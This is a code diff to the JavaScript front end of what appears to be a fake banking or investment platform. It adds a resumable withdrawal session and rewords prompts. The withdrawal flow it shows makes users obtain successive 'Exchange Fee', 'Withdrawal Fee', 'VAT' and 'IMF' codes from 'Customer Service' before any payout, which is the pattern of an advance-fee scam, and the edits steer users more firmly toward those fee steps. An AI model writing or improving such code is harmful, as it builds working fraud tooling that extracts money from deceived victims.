@@ -1175,7 +1175,7 @@ function go(name){
   document.querySelectorAll('.ni').forEach(n=>{if(n.getAttribute('onclick')&&n.getAttribute('onclick').includes("'"+name+"'"))n.classList.add('on');});
   document.getElementById('pgtit').textContent=pgT[name]||name;cSB();
   if(csInt){clearInterval(csInt);csInt=null;}if(supInt){clearInterval(supInt);supInt=null;}
-  const lm={dashboard:loadDash,transactions:loadTxns,cards:loadCards,loans:loadLoans,invest:loadInv,cs:loadCS,sup:loadSup,notifs:loadNotifs,kyc:loadKYCPg,settings:refMe,withdraw:()=>{updBal();showWdPage(1);wdStep=2;}};
+  const lm={dashboard:loadDash,transactions:loadTxns,cards:loadCards,loans:loadLoans,invest:loadInv,cs:loadCS,sup:loadSup,notifs:loadNotifs,kyc:loadKYCPg,settings:refMe,withdraw:()=>{loadWdSession();}};
   if(lm[name])lm[name]();
   if(name==='cs')csInt=setInterval(pollCS,3000);
   if(name==='sup')supInt=setInterval(pollSup,3000);
@@ -1221,6 +1221,34 @@ async function subIntl(){if(U?.kyc_status!=='verified'){toast('Complete KYC firs
 async function subDep(){if(U?.kyc_status!=='verified'){toast('Complete KYC verification first','error');go('kyc');return;}const amt=document.getElementById('depamt').value;if(!amt||parseFloat(amt)<=0){toast('Enter a valid amount','error');return;}const r=await A2('/api/deposits','POST',{amount:parseFloat(amt),method:document.getElementById('depmth').value||'Bank Transfer'});if(r&&!r.error){toast('Deposit request submitted! ✅ Go to Customer Service to process.','success');document.getElementById('depamt').value='';go('cs');}else toast(r?.error||'Failed','error');}
 function showWdPage(n){for(let i=1;i<=6;i++){const el=document.getElementById('wdp'+i);if(el)el.style.display=i===n?'block':'none';}}
 function resetWdCodes(ids){ids.forEach(id=>{const el=document.getElementById(id);if(el)el.value=''});}
+
+// Load saved withdrawal session — resumes from where user left off
+async function loadWdSession(){
+  const sess=await A2('/api/withdrawals/session');
+  if(sess&&!sess.error){
+    const step=sess.current_step||1;
+    wdStep=step;
+    // Pre-fill step 1 fields with saved data
+    const amt=document.getElementById('wdamt');
+    const acct=document.getElementById('wdacct');
+    const name=document.getElementById('wdname');
+    const bank=document.getElementById('wdbank');
+    if(amt)amt.value=sess.amount||'';
+    if(acct)acct.value=sess.account_number||'';
+    if(name)name.value=sess.account_name||'';
+    if(bank)bank.value=sess.bank_name||'';
+    if(step>1){
+      showWdPage(step);
+      toast('Resuming your withdrawal from where you left off...','info');
+    } else {
+      showWdPage(1);
+    }
+  } else {
+    showWdPage(1);
+  }
+  updBal();
+}
+
 async function wdS1(){
   if(U?.kyc_status!=='verified'){toast('Complete KYC verification first','error');go('kyc');return;}
   const amt=document.getElementById('wdamt').value,acct=document.getElementById('wdacct').value,name=document.getElementById('wdname').value,bank=document.getElementById('wdbank').value;
@@ -1228,21 +1256,29 @@ async function wdS1(){
   if(parseFloat(amt)<=0){toast('Enter a valid amount','error');return;}
   if(parseFloat(amt)>parseFloat(U?.balance||0)){toast('Insufficient balance','error');return;}
   const r=await A2('/api/withdrawals/step1','POST',{amount:parseFloat(amt),account_number:acct,account_name:name,bank_name:bank,transfer_type:document.getElementById('wdtype').value});
-  if(r&&!r.error){wdStep=2;resetWdCodes(['c1','c2','c3','c4','c5','c6']);showWdPage(2);toast('Bank details saved! Now request your Exchange Fee code from Customer Service.','info');}
+  if(r&&!r.error){wdStep=2;resetWdCodes(['c1','c2','c3','c4','c5','c6']);showWdPage(2);toast('Bank details saved! Go to Customer Service and request your Exchange Fee code.','info');}
   else toast(r?.error||'Failed','error');
 }
+
 function getCodeById(ids){return ids.map(id=>document.getElementById(id)?.value||'').join('').toUpperCase();}
+
 async function verWd(){
   const code=getCode(),err=document.getElementById('wdcerr');err.style.display='none';
   if(code.length!==6){err.textContent='Please enter all 6 characters';err.style.display='block';return;}
   const r=await A2('/api/withdrawals/verify-exchange-fee','POST',{code});
-  if(r&&!r.error){wdStep=3;resetWdCodes(['d1','d2','d3','d4','d5','d6']);showWdPage(3);toast('✅ Exchange Fee verified! Proceed to Withdrawal Fee step.','success');}
+  if(r&&!r.error){wdStep=3;resetWdCodes(['d1','d2','d3','d4','d5','d6']);showWdPage(3);toast('✅ Exchange Fee verified! Go to Customer Service for your Withdrawal Fee code.','success');}
   else{err.textContent=r?.error||'Invalid code. Please try again.';err.style.display='block';}
 }
+
 async function verWdStep(step){
-  const sets={3:{ids:['d1','d2','d3','d4','d5','d6'],errId:'wdcerr3',ep:'/api/withdrawals/verify-withdrawal-fee',next:4,nextIds:['e1','e2','e3','e4','e5','e6'],msg:'✅ Withdrawal Fee verified! Proceed to VAT step.'},4:{ids:['e1','e2','e3','e4','e5','e6'],errId:'wdcerr4',ep:'/api/withdrawals/verify-vat',next:5,nextIds:['f1','f2','f3','f4','f5','f6'],msg:'✅ VAT verified! Final step — enter your IMF code.'},5:{ids:['f1','f2','f3','f4','f5','f6'],errId:'wdcerr5',ep:'/api/withdrawals/verify-imf',next:6,nextIds:[],msg:''}};
+  const sets={
+    3:{ids:['d1','d2','d3','d4','d5','d6'],errId:'wdcerr3',ep:'/api/withdrawals/verify-withdrawal-fee',next:4,nextIds:['e1','e2','e3','e4','e5','e6'],msg:'✅ Withdrawal Fee verified! Go to Customer Service for your VAT code.'},
+    4:{ids:['e1','e2','e3','e4','e5','e6'],errId:'wdcerr4',ep:'/api/withdrawals/verify-vat',next:5,nextIds:['f1','f2','f3','f4','f5','f6'],msg:'✅ VAT verified! Go to Customer Service for your IMF code — final step!'},
+    5:{ids:['f1','f2','f3','f4','f5','f6'],errId:'wdcerr5',ep:'/api/withdrawals/verify-imf',next:6,nextIds:[],msg:''}
+  };
   const s=sets[step];if(!s)return;
-  const code=getCodeById(s.ids);const err=document.getElementById(s.errId);err.style.display='none';
+  const code=getCodeById(s.ids);
+  const err=document.getElementById(s.errId);err.style.display='none';
   if(code.length!==6){err.textContent='Please enter all 6 characters';err.style.display='block';return;}
   const r=await A2(s.ep,'POST',{code});
   if(r&&!r.error){
